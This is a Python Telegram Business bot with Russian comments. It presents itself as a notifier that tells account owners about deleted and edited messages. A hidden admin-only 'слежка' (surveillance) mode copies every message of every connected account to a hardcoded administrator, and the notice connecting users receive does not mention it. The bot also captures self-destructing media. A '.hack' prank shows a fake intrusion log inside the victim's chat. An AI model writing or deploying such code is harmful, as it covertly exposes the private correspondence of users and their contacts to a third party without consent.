#!/usr/bin/env python3
"""
Telegram Business Monitor Bot

• Уведомляет ВЛАДЕЛЬЦА бизнес-аккаунта об удалённых/изменённых сообщениях.
• Режим слежки (/check) — копирует АДМИНУ абсолютно все сообщения
  подключённых аккаунтов (кроме исключённых через /exclude).

Админские команды (только для ADMIN_ID):
  /users              — кто подключил бота
  /check              — вкл/выкл пересылку всех сообщений админу
  /monitors           — статус слежки и список наблюдаемых
  /exclude @u @chat … — не пересылать от этих юзеров/чатов
  /include @u @chat … — вернуть пересылку

Прикол (печатает владелец в чате с собеседником):
  .hack               — бот «взламывает» собеседника анимацией в его же чате
"""

import asyncio
import json
import logging
import os
from datetime import datetime
from collections import defaultdict

from telegram import Update, BotCommand, BotCommandScopeChat
from telegram.ext import Application, CommandHandler, TypeHandler, ContextTypes
from telegram.constants import ParseMode
from telegram.error import RetryAfter, BadRequest

# Конфиг берётся из переменных окружения (для Railway), с локальными значениями по умолчанию.
TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "347799240"))

# DATA_DIR — на Railway укажи примонтированный Volume (например /data),
# иначе state.json потеряется при перезапуске (файловая система там эфемерна).
DATA_DIR = os.environ.get("DATA_DIR", os.path.dirname(__file__))
STATE_FILE = os.path.join(DATA_DIR, "state.json")

logging.basicConfig(
    format="%(asctime)s  %(levelname)-8s  %(message)s",
    level=logging.INFO,
)
log = logging.getLogger(__name__)

# conn_id -> {"owner": int, "name": str, "username": str|None}
_conns: dict[str, dict] = {}
# глобальный режим зеркалирования всех сообщений админу
_settings: dict = {"check": False}
# токены, которые НЕ пересылать (username в нижнем регистре без @, либо id-строка)
_excluded: set[str] = set()
# Кэш сообщений: conn_id -> chat_id -> msg_id -> данные
_cache: dict = defaultdict(lambda: defaultdict(dict))

# ── прикол .hack ──
HACK_TRIGGER = ".hack"
_ignore_deletes: set = set()    # message_id, удаления которых не нужно репортить

_HACK_LINES = [
    "root@kali:~# ssh exploit@{target}",
    "[*] Эксплойт-фреймворк v4.2.1 загружен",
    "[*] Сканирование цели {target} ...",
    "[*] Поиск уязвимостей  [■□□□□□□□□□]   7%",
    "[+] CVE-2024-31337 обнаружена",
    "[*] Обход Telegram Security [■■■□□□□□□□] 26%",
    "[+] sudo доступ получен",
    "[*] inject payload 0xDEADBEEF ...",
    "[*] Брутфорс 2FA      [■■■■■□□□□□]  48%",
    "[+] 2FA обойдена: ******",
    "[*] Дешифровка AES-256-GCM ...",
    "[+] ключ: 9f2a4c1e..b7d3   OK",
    "[*] Доступ к памяти устройства ...",
    "[*] Выгрузка данных   [■■■■■■■□□□]  73%",
    "[+] контакты ........ 1247",
    "[+] фотографии ...... 389",
    "[+] переписки ....... 12.4k",
    "[+] пароли .......... 64",
    "[+] гео: 55.7558°N, 37.6173°E",
    "[*] Отправка на сервер [■■■■■■■■■□] 94%",
    "[+] IP 185.230.14.92  →  LEAKED",
    "[*] Установка руткита ...",
    "[+] persistence: enabled",
    "[■■■■■■■■■■] 100%",
    "[+] ✅ ACCESS GRANTED",
    "[!] 😈 я внутри. твой телефон теперь мой.",
    "[!] активация камеры 📸 ...",
]


def _hack_frame(shown: list[str]) -> str:
    """Кадр анимации: последние строки «терминала» в моноблоке с курсором."""
    body = "\n".join(shown[-14:]) + "\n█"
    return f"<pre>{_esc(body)}</pre>"


async def _run_hack(bot, conn: str, chat_id: int, target: str) -> None:
    """Шлёт сообщение от лица аккаунта и анимирует «взлом» собеседника."""
    try:
        m = await bot.send_message(
            chat_id, f"<pre>{_esc('root@kali:~# _')}</pre>",
            parse_mode=ParseMode.HTML, business_connection_id=conn)
    except Exception:
        log.exception("hack: не удалось отправить стартовое сообщение")
        return

    mid = m.message_id
    shown: list[str] = []
    for raw in _HACK_LINES:
        shown.append(raw.replace("{target}", target))
        try:
            await bot.edit_message_text(
                _hack_frame(shown), chat_id=chat_id, message_id=mid,
                parse_mode=ParseMode.HTML, business_connection_id=conn)
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after + 0.5)
        except BadRequest as e:
            # сообщение анимации удалили — выходим тихо
            if "not found" in str(e).lower() or "message to edit" in str(e).lower():
                log.info("hack: сообщение удалено, останавливаю анимацию")
                return
            # «message is not modified» и прочее — просто продолжаем
        except Exception:
            # сетевые сбои/таймауты НЕ должны прерывать анимацию — пропускаем кадр
            log.warning("hack: пропускаю кадр из-за ошибки", exc_info=True)
        await asyncio.sleep(0.9 if ("■" in raw or "✅" in raw) else 0.7)

    await asyncio.sleep(1.5)
    final = ("😂 <b>ШУТКА!</b> Расслабься, тебя пранканули )))\n\n"
             "Никто тебя не взламывал 😄")
    try:
        await bot.edit_message_text(
            final, chat_id=chat_id, message_id=mid,
            parse_mode=ParseMode.HTML, business_connection_id=conn)
    except Exception:
        pass


# ── персистентность ──────────────────────────────────────────────────────────

def _load_state() -> None:
    if not os.path.exists(STATE_FILE):
        return
    with open(STATE_FILE, encoding="utf-8") as f:
        data = json.load(f)
    _conns.update(data.get("conns", {}))
    _settings["check"] = data.get("check", False)
    _excluded.update(data.get("exclude", []))
    log.info("State loaded: %d conn(s), check=%s, %d exclusion(s)",
             len(_conns), _settings["check"], len(_excluded))


def _save_state() -> None:
    data = {
        "conns": _conns,
        "check": _settings["check"],
        "exclude": sorted(_excluded),
    }
    with open(STATE_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


# ── утилиты ──────────────────────────────────────────────────────────────────

def _esc(s: str) -> str:
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def _short(s, n=3500):
    """Обрезает сырой текст ДО экранирования, чтобы не порвать HTML-сущности."""
    if s and len(s) > n:
        return s[:n] + "…"
    return s


def _norm(s: str) -> str:
    return s.lstrip("@").lower().strip()


def _who(msg) -> str:
    if msg.from_user:
        u = msg.from_user
        tag = f" (@{u.username})" if u.username else ""
        return f"{u.full_name}{tag} [ID {u.id}]"
    if msg.sender_chat:
        c = msg.sender_chat
        return f"{c.title or c.id} [Chat {c.id}]"
    return "Unknown"


def _chat_name(chat) -> str:
    return chat.title or chat.full_name or str(chat.id)


def _partner(chat) -> str:
    """Собеседник, с кем ведётся переписка (для приватного бизнес-чата)."""
    if chat is None:
        return "?"
    name = chat.full_name or chat.title or str(chat.id)
    uname = f" @{chat.username}" if getattr(chat, "username", None) else ""
    return f"{name}{uname} [ID {chat.id}]"


def _direction(msg, conn: str) -> str:
    """Куда направлено сообщение относительно владельца аккаунта."""
    owner = _conns.get(conn, {}).get("owner")
    if msg.from_user and owner and msg.from_user.id == owner:
        return "➡️ Исходящее (владелец → собеседник)"
    return "⬅️ Входящее (собеседник → владелец)"


def _dedup(ids):
    seen, out = set(), []
    for i in ids:
        if i and i not in seen:
            seen.add(i)
            out.append(i)
    return out


def _ttl_of(msg) -> int | None:
    """TTL (сек) самосгорающегося медиа, если Telegram прислал такой флаг.
    Bot API не моделирует это поле явно — ищем его в api_kwargs сообщения и медиа.
    Возвращает: число секунд, 0 (флаг есть без числа) или None (не самосгорающееся)."""
    def scan(kw):
        if not kw:
            return None
        for k, v in kw.items():
            if any(t in k.lower() for t in ("ttl", "destruct", "self_dest")):
                try:
                    return int(v)
                except (TypeError, ValueError):
                    return 0
        return None

    t = scan(getattr(msg, "api_kwargs", None))
    if t is not None:
        return t
    medias = list(msg.photo or [])
    medias += [msg.video, msg.voice, msg.video_note, msg.animation, msg.document]
    for media in medias:
        if media is not None:
            t = scan(getattr(media, "api_kwargs", None))
            if t is not None:
                return t
    return None


def _is_sd_notice(msg) -> bool:
    """True, если это служебное уведомление о самосгорающемся медиа
    (Telegram присылает ботам только текст, без самого файла)."""
    t = (msg.text or msg.caption or "").lower()
    return any(k in t for k in (
        "самоуничтож",        # RU
        "self-destruct", "self destruct", "destructing",  # EN
    ))


def _ts(dt) -> str:
    return dt.strftime("%d.%m.%Y %H:%M:%S UTC") if dt else "?"


def _tokens_user(u) -> set[str]:
    t = set()
    if u:
        if u.username:
            t.add(u.username.lower())
        t.add(str(u.id))
    return t


def _tokens_chat(chat) -> set[str]:
    t = set()
    if chat:
        if getattr(chat, "username", None):
            t.add(chat.username.lower())
        t.add(str(chat.id))
    return t


def _excluded_msg(msg) -> bool:
    return bool((_tokens_user(msg.from_user) | _tokens_chat(msg.chat)) & _excluded)


def _save(conn_id: str, msg) -> None:
    _cache[conn_id][msg.chat.id][msg.message_id] = {
        "who":     _who(msg),
        "chat":    _chat_name(msg.chat),
        "at":      msg.date,
        "utok":    list(_tokens_user(msg.from_user)),
        "text":    msg.text or msg.caption,
        "photo":   msg.photo[-1].file_id if msg.photo else None,
        "video":   msg.video.file_id if msg.video else None,
        "doc":     (msg.document.file_id, msg.document.file_name or "") if msg.document else None,
        "audio":   msg.audio.file_id if msg.audio else None,
        "voice":   msg.voice.file_id if msg.voice else None,
        "vnote":   msg.video_note.file_id if msg.video_note else None,
        "sticker": (msg.sticker.file_id, msg.sticker.emoji or "") if msg.sticker else None,
        "gif":     msg.animation.file_id if msg.animation else None,
    }


async def _resolve_owner(ctx: ContextTypes.DEFAULT_TYPE, conn_id: str) -> int | None:
    """user_id владельца соединения; при необходимости тянет данные у Telegram."""
    if conn_id in _conns:
        return _conns[conn_id]["owner"]
    try:
        bc = await ctx.bot.get_business_connection(conn_id)
        u = bc.user
        _conns[conn_id] = {"owner": u.id, "name": u.full_name, "username": u.username}
        _save_state()
        log.info("Resolved owner via API: conn=%s owner=%d", conn_id, u.id)
        return u.id
    except Exception as exc:
        log.warning("Cannot resolve owner for conn %s: %s", conn_id, exc)
        return None


async def _send_content(ctx, to_id: int, c: dict, hdr: str) -> None:
    """Пересылает закэшированное содержимое сообщения получателю to_id."""
    if c["photo"]:
        cap = hdr + (f"\n🖼 {_esc(_short(c['text'], 400))}" if c["text"] else "")
        await ctx.bot.send_photo(to_id, c["photo"], caption=cap, parse_mode=ParseMode.HTML)
    elif c["video"]:
        cap = hdr + (f"\n{_esc(_short(c['text'], 400))}" if c["text"] else "")
        await ctx.bot.send_video(to_id, c["video"], caption=cap, parse_mode=ParseMode.HTML)
    elif c["doc"]:
        fid, name = c["doc"]
        cap = hdr + (f"\n📎 {_esc(name)}" if name else "")
        if c["text"]:
            cap += f"\n{_esc(_short(c['text'], 300))}"
        await ctx.bot.send_document(to_id, fid, caption=cap, parse_mode=ParseMode.HTML)
    elif c["voice"]:
        await ctx.bot.send_voice(to_id, c["voice"], caption=hdr + "\n🎙 Голосовое", parse_mode=ParseMode.HTML)
    elif c["audio"]:
        await ctx.bot.send_audio(to_id, c["audio"], caption=hdr, parse_mode=ParseMode.HTML)
    elif c["vnote"]:
        await ctx.bot.send_message(to_id, hdr + "\n📹 Видеокружок", parse_mode=ParseMode.HTML)
        await ctx.bot.send_video_note(to_id, c["vnote"])
    elif c["gif"]:
        await ctx.bot.send_animation(to_id, c["gif"], caption=hdr + "\n🎬 GIF", parse_mode=ParseMode.HTML)
    elif c["sticker"]:
        fid, emoji = c["sticker"]
        await ctx.bot.send_message(to_id, hdr + f"\n🎭 Стикер: {emoji}", parse_mode=ParseMode.HTML)
        await ctx.bot.send_sticker(to_id, fid)
    elif c["text"]:
        await ctx.bot.send_message(to_id, hdr + f"\n💬 {_esc(_short(c['text']))}", parse_mode=ParseMode.HTML)
    else:
        await ctx.bot.send_message(to_id, hdr + "\n❓ Медиа (тип не определён)", parse_mode=ParseMode.HTML)


# ── обработчики бизнес-событий ───────────────────────────────────────────────

async def on_new_msg(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    msg = update.business_message

    # сообщения, отправленные самим ботом (в т.ч. анимация .hack) — игнорируем
    if msg.sender_business_bot is not None:
        return

    conn = msg.business_connection_id or "x"
    _save(conn, msg)
    owner = await _resolve_owner(ctx, conn)  # заодно регистрируем аккаунт для /users
    c = _cache[conn][msg.chat.id][msg.message_id]

    # ── прикол .hack: владелец «взламывает» собеседника прямо в его чате ──
    if (msg.from_user and owner and msg.from_user.id == owner
            and (msg.text or "").strip().lower() == HACK_TRIGGER):
        target = (msg.chat.username or msg.chat.first_name
                  or msg.chat.full_name or "target")
        _ignore_deletes.add(msg.message_id)
        try:
            await ctx.bot.delete_business_messages(conn, [msg.message_id])
        except Exception:
            log.exception("hack: не удалось удалить триггер .hack")
        ctx.application.create_task(_run_hack(ctx.bot, conn, msg.chat.id, target))
        return

    admin_too = _settings["check"] and not _excluded_msg(msg)

    # ── 1а) самосгорающееся медиа С файлом (если Telegram всё же отдал TTL) ──
    ttl = _ttl_of(msg)
    if ttl is not None:
        c["sd"] = True
        ttl_txt = f" · сгорит через {ttl}с" if ttl else ""
        hdr = (
            f"🔥 <b>Самосгорающееся медиа</b>{ttl_txt}\n"
            f"👤 От: {_esc(_who(msg))}\n"
            f"👥 Собеседник: {_esc(_partner(msg.chat))}\n"
            f"{_direction(msg, conn)}\n"
            f"🕐 {_ts(msg.date)}\n"
        )
        for t in _dedup([owner, ADMIN_ID if admin_too else None]):
            try:
                await _send_content(ctx, t, c, hdr)
            except Exception:
                log.exception("self-destruct forward failed -> %s", t)
        return

    # ── 1б) уведомление о самосгорающемся БЕЗ файла (Bot API не отдаёт фото) ──
    if _is_sd_notice(msg):
        c["sd"] = True
        hdr = (
            f"🔥 <b>Собеседник прислал самосгорающееся фото/видео</b>\n"
            f"👤 От: {_esc(_who(msg))}\n"
            f"👥 Собеседник: {_esc(_partner(msg.chat))}\n"
            f"{_direction(msg, conn)}\n"
            f"🕐 {_ts(msg.date)}\n"
            f"📝 {_esc(msg.text or msg.caption or '')}\n"
            f"\n⚠️ Само медиа Telegram ботам не передаёт — открыть его можно только "
            f"вручную на телефоне."
        )
        for t in _dedup([owner, ADMIN_ID if admin_too else None]):
            try:
                await ctx.bot.send_message(t, hdr, parse_mode=ParseMode.HTML)
            except Exception:
                log.exception("sd-notice forward failed -> %s", t)
        return

    # ── 2) режим слежки: копия всего админу ──
    if _settings["check"] and not _excluded_msg(msg):
        meta = _conns.get(conn, {})
        hdr = (
            f"📨 <b>Слежка</b> · аккаунт {_esc(meta.get('name', '?'))}\n"
            f"👤 От: {_esc(_who(msg))}\n"
            f"👥 Собеседник: {_esc(_partner(msg.chat))}\n"
            f"{_direction(msg, conn)}\n"
            f"🕐 {_ts(msg.date)}\n"
        )
        try:
            await _send_content(ctx, ADMIN_ID, c, hdr)
        except Exception:
            log.exception("mirror to admin failed (msg %d)", msg.message_id)


async def on_edit_msg(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    msg = update.edited_business_message

    # правки самого бота (анимация .hack) — не репортим
    if msg.sender_business_bot is not None:
        return

    conn = msg.business_connection_id or "x"
    owner = await _resolve_owner(ctx, conn)

    excluded = _excluded_msg(msg)
    recipients = [owner] if owner else []
    if _settings["check"] and not excluded and ADMIN_ID != owner:
        recipients.append(ADMIN_ID)
    if not recipients:
        return

    old = _cache.get(conn, {}).get(msg.chat.id, {}).get(msg.message_id)
    old_text = (old.get("text") or "") if old else ""
    new_text = msg.text or msg.caption or ""
    ts = datetime.utcnow().strftime("%d.%m.%Y %H:%M:%S UTC")

    body = (
        f"✏️ <b>Сообщение изменено</b>\n\n"
        f"👤 {_esc(_who(msg))}\n"
        f"👥 Собеседник: {_esc(_partner(msg.chat))}\n"
        f"🕐 {ts}\n"
        f"🆔 ID сообщения: {msg.message_id}\n"
    )
    if old_text:
        body += f"\n<b>Было:</b>\n<blockquote>{_esc(_short(old_text))}</blockquote>\n"
    if new_text:
        body += f"\n<b>Стало:</b>\n<blockquote>{_esc(_short(new_text))}</blockquote>"

    for r in recipients:
        try:
            await ctx.bot.send_message(r, body, parse_mode=ParseMode.HTML)
        except Exception:
            log.exception("edit notify failed -> %s", r)
    _save(conn, msg)


async def on_delete_msgs(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    d = update.deleted_business_messages
    conn = d.business_connection_id
    owner = await _resolve_owner(ctx, conn)

    chat_excluded = bool(_tokens_chat(d.chat) & _excluded)
    base_recipients = [owner] if owner else []
    if _settings["check"] and not chat_excluded and ADMIN_ID != owner:
        base_recipients.append(ADMIN_ID)
    if not base_recipients:
        log.warning("No recipients for deleted msgs (conn %s)", conn)
        return

    partner = _partner(d.chat)
    ts = datetime.utcnow().strftime("%d.%m.%Y %H:%M:%S UTC")

    for mid in d.message_ids:
        # триггер .hack, удалённый самим ботом — не репортим
        if mid in _ignore_deletes:
            _ignore_deletes.discard(mid)
            continue

        c = _cache.get(conn, {}).get(d.chat.id, {}).get(mid)

        # исключение по отправителю (из кэша), если задано
        if c and set(c.get("utok", [])) & _excluded:
            recipients = [owner] if owner else []
        else:
            recipients = list(base_recipients)
        if not recipients:
            continue

        hdr = (
            f"🗑 <b>Сообщение удалено</b>\n\n"
            f"👥 Собеседник: {_esc(partner)}\n"
            f"🕑 Удалено: {ts}\n"
            f"🆔 ID: {mid}\n"
        )

        if not c:
            for r in recipients:
                try:
                    await ctx.bot.send_message(
                        r, hdr + "\n⚠️ Содержимое неизвестно — получено до запуска бота",
                        parse_mode=ParseMode.HTML)
                except Exception:
                    log.exception("delete notify failed -> %s", r)
            continue

        hdr += f"👤 {_esc(c['who'])}\n📤 Отправлено: {_ts(c['at'])}\n"

        # самосгорающееся уже переслали при получении — не дублируем медиа
        if c.get("sd"):
            for r in recipients:
                try:
                    await ctx.bot.send_message(
                        r, hdr + "\n🔥 Самосгорающееся медиа (уже переслано при получении)",
                        parse_mode=ParseMode.HTML)
                except Exception:
                    log.exception("delete notify failed -> %s", r)
            continue

        for r in recipients:
            try:
                await _send_content(ctx, r, c, hdr)
            except Exception as exc:
                log.exception("Ошибка пересылки удалённого %d -> %s", mid, r)
                try:
                    await ctx.bot.send_message(
                        r, hdr + f"\n⚠️ Ошибка пересылки: {_esc(str(exc))}",
                        parse_mode=ParseMode.HTML)
                except Exception:
                    pass


async def on_business_connect(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    conn = update.business_connection
    u = conn.user

    if conn.is_enabled:
        _conns[conn.id] = {"owner": u.id, "name": u.full_name, "username": u.username}
        _save_state()
        log.info("Business connected: conn=%s owner=%d", conn.id, u.id)
        await ctx.bot.send_message(
            u.id,
            "🔗 <b>Бизнес-аккаунт подключён ✅</b>\n"
            "Я буду присылать уведомления об удалённых и изменённых сообщениях.\n\n"
            "🎭 Прикол: напиши <code>.hack</code> в чате с человеком — "
            "и я запущу анимацию «взлома» прямо в его чате.",
            parse_mode=ParseMode.HTML,
        )
        if u.id != ADMIN_ID:
            uname = f"@{u.username}" if u.username else "—"
            await ctx.bot.send_message(
                ADMIN_ID,
                f"➕ <b>Новый аккаунт подключил бота</b>\n"
                f"👤 {_esc(u.full_name)} ({_esc(uname)})\n"
                f"🆔 ID <code>{u.id}</code>",
                parse_mode=ParseMode.HTML,
            )
    else:
        _conns.pop(conn.id, None)
        _save_state()
        log.info("Business disconnected: conn=%s owner=%d", conn.id, u.id)
        await ctx.bot.send_message(
            u.id, "🔌 <b>Бизнес-аккаунт отключён</b>\nМониторинг остановлен.",
            parse_mode=ParseMode.HTML,
        )


# ── маршрутизатор бизнес-обновлений ──────────────────────────────────────────

async def _route(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if update.business_message:
        await on_new_msg(update, ctx)
    elif update.edited_business_message:
        await on_edit_msg(update, ctx)
    elif update.deleted_business_messages:
        await on_delete_msgs(update, ctx)
    elif update.business_connection:
        await on_business_connect(update, ctx)


# ── админские команды ────────────────────────────────────────────────────────

def _is_admin(update: Update) -> bool:
    return bool(update.effective_user and update.effective_user.id == ADMIN_ID)


def _fmt_conn(i: int, m: dict) -> str:
    uname = f"@{m['username']}" if m.get("username") else "—"
    return f"{i}. {_esc(m.get('name', '?'))} ({_esc(uname)}) — ID <code>{m['owner']}</code>"


async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    txt = (
        "Бот мониторинга бизнес-чатов.\n\n"
        "Подключение: Telegram → Настройки → Telegram Business → Чат-боты → выбрать этого бота.\n"
        "После подключения уведомления приходят автоматически."
    )
    if _is_admin(update):
        txt += (
            "\n\n<b>Админ-команды:</b>\n"
            "/users — кто подключил бота\n"
            "/check — вкл/выкл пересылку всех сообщений тебе\n"
            "/monitors — статус слежки и наблюдаемые\n"
            "/exclude @user 123 — не пересылать от них\n"
            "/include @user 123 — вернуть пересылку"
        )
    await update.effective_message.reply_text(txt, parse_mode=ParseMode.HTML)


async def cmd_users(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not _is_admin(update):
        return
    if not _conns:
        await update.effective_message.reply_text("Пока никто не подключил бота.")
        return
    lines = ["<b>Подключённые аккаунты:</b>\n"]
    lines += [_fmt_conn(i, m) for i, m in enumerate(_conns.values(), 1)]
    await update.effective_message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)


async def cmd_check(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not _is_admin(update):
        return
    _settings["check"] = not _settings["check"]
    _save_state()
    if _settings["check"]:
        await update.effective_message.reply_text(
            "✅ <b>Слежка ВКЛЮЧЕНА.</b>\n"
            "Все сообщения подключённых аккаунтов пересылаются тебе (кроме исключённых).",
            parse_mode=ParseMode.HTML)
    else:
        await update.effective_message.reply_text("⏹ <b>Слежка ВЫКЛЮЧЕНА.</b>", parse_mode=ParseMode.HTML)


async def cmd_monitors(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not _is_admin(update):
        return
    state = "ВКЛ ✅" if _settings["check"] else "ВЫКЛ ⏹"
    lines = [f"<b>Слежка (/check):</b> {state}\n"]
    if _conns:
        lines.append("<b>Под наблюдением:</b>")
        lines += [_fmt_conn(i, m) for i, m in enumerate(_conns.values(), 1)]
    else:
        lines.append("Нет подключённых аккаунтов.")
    if _excluded:
        lines.append("\n<b>Исключения:</b> " + ", ".join(_esc(x) for x in sorted(_excluded)))
    await update.effective_message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)


async def cmd_exclude(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not _is_admin(update):
        return
    if not ctx.args:
        await update.effective_message.reply_text("Использование: /exclude @user 123456789 …")
        return
    added = []
    for a in ctx.args:
        tok = _norm(a)
        if tok:
            _excluded.add(tok)
            added.append(a)
    _save_state()
    await update.effective_message.reply_text("🚫 Исключены: " + ", ".join(added) if added else "Ничего не добавлено.")


async def cmd_include(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not _is_admin(update):
        return
    if not ctx.args:
        await update.effective_message.reply_text("Использование: /include @user 123456789 …")
        return
    removed = []
    for a in ctx.args:
        tok = _norm(a)
        if tok in _excluded:
            _excluded.discard(tok)
            removed.append(a)
    _save_state()
    if removed:
        await update.effective_message.reply_text("✅ Возвращены: " + ", ".join(removed))
    else:
        await update.effective_message.reply_text("Никого из указанных не было в исключениях.")


# ── запуск ────────────────────────────────────────────────────────────────────

async def _post_init(app: Application) -> None:
    """Показывает меню админ-команд только в чате администратора."""
    cmds = [
        BotCommand("users", "Кто подключил бота"),
        BotCommand("check", "Вкл/выкл пересылку всех сообщений"),
        BotCommand("monitors", "Статус слежки и наблюдаемые"),
        BotCommand("exclude", "Не пересылать от @user/id"),
        BotCommand("include", "Вернуть пересылку"),
    ]
    try:
        await app.bot.set_my_commands(cmds, scope=BotCommandScopeChat(chat_id=ADMIN_ID))
    except Exception as exc:
        log.warning("set_my_commands failed: %s", exc)


def main() -> None:
    os.makedirs(DATA_DIR, exist_ok=True)
    _load_state()
    app = Application.builder().token(TOKEN).post_init(_post_init).concurrent_updates(True).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("users", cmd_users))
    app.add_handler(CommandHandler("check", cmd_check))
    app.add_handler(CommandHandler("monitors", cmd_monitors))
    app.add_handler(CommandHandler("exclude", cmd_exclude))
    app.add_handler(CommandHandler("include", cmd_include))
    app.add_handler(TypeHandler(Update, _route))

    log.info("Bot started, polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
